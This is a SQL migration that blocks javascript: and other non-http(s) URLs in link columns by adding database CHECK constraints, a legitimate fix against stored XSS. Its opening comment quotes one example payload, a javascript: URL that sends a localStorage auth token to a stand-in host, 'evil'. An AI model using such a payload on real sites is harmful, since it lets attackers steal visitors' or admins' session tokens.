-- Reject non-http(s) URLs at the database boundary.
--
-- Every link column is rendered straight into an <a href>. The edit form checks
-- `^https?://` in the browser and the verification form has its own isValidUrl(),
-- but the server-side validators are only `z.string().max(500)` and there was no
-- CHECK constraint anywhere -- so a single PATCH could store
--
--   github_url = 'javascript:fetch("https://evil/"+localStorage.getItem("sb-...-auth-token"))'
--
-- and any visitor clicking the link on that profile would run it, with the
-- session token sitting in localStorage next to it. The client-side regex is UX;
-- this is the boundary.
--
-- Values that already violate the rule are nulled out first so the constraint
-- validates. Storage public URLs and every legitimate link are https://, so in
-- practice this rewrites nothing.

-- ---------------------------------------------------------------------------
-- profiles
-- ---------------------------------------------------------------------------

update public.profiles set avatar_url    = null where avatar_url    is not null and avatar_url    !~* '^https?://';
update public.profiles set github_url    = null where github_url    is not null and github_url    !~* '^https?://';
update public.profiles set portfolio_url = null where portfolio_url is not null and portfolio_url !~* '^https?://';
update public.profiles set startup_url   = null where startup_url   is not null and startup_url   !~* '^https?://';
update public.profiles set traction_url  = null where traction_url  is not null and traction_url  !~* '^https?://';
update public.profiles set contract_url  = null where contract_url  is not null and contract_url  !~* '^https?://';

do $$
declare
  _col text;
begin
  foreach _col in array array[
    'avatar_url', 'github_url', 'portfolio_url', 'startup_url', 'traction_url', 'contract_url'
  ] loop
    execute format(
      'alter table public.profiles drop constraint if exists %I',
      'profiles_' || _col || '_scheme'
    );
    execute format(
      'alter table public.profiles add constraint %I check (%I is null or %I ~* ''^https?://'')',
      'profiles_' || _col || '_scheme', _col, _col
    );
  end loop;
end $$;

-- ---------------------------------------------------------------------------
-- posts
-- ---------------------------------------------------------------------------

update public.posts set image_url = null where image_url is not null and image_url !~* '^https?://';

alter table public.posts drop constraint if exists posts_image_url_scheme;
alter table public.posts add constraint posts_image_url_scheme
  check (image_url is null or image_url ~* '^https?://');

-- ---------------------------------------------------------------------------
-- pitches
-- ---------------------------------------------------------------------------

update public.pitches set deck_url = null where deck_url is not null and deck_url !~* '^https?://';

alter table public.pitches drop constraint if exists pitches_deck_url_scheme;
alter table public.pitches add constraint pitches_deck_url_scheme
  check (deck_url is null or deck_url ~* '^https?://');

-- ---------------------------------------------------------------------------
-- verification_requests
-- ---------------------------------------------------------------------------
-- These are what an admin clicks while reviewing an application, which makes
-- them the most attractive target of the three: the payload would run in an
-- admin's session.

do $$
declare
  _col text;
begin
  foreach _col in array array[
    'github_url', 'live_project_url', 'portfolio_url',
    'linkedin_or_x_url', 'link_primary', 'link_secondary'
  ] loop
    if exists (
      select 1 from information_schema.columns
       where table_schema = 'public'
         and table_name = 'verification_requests'
         and column_name = _col
    ) then
      execute format(
        'update public.verification_requests set %I = null where %I is not null and %I !~* ''^https?://''',
        _col, _col, _col
      );
      execute format(
        'alter table public.verification_requests drop constraint if exists %I',
        'vr_' || _col || '_scheme'
      );
      execute format(
        'alter table public.verification_requests add constraint %I check (%I is null or %I ~* ''^https?://'')',
        'vr_' || _col || '_scheme', _col, _col
      );
    end if;
  end loop;
end $$;
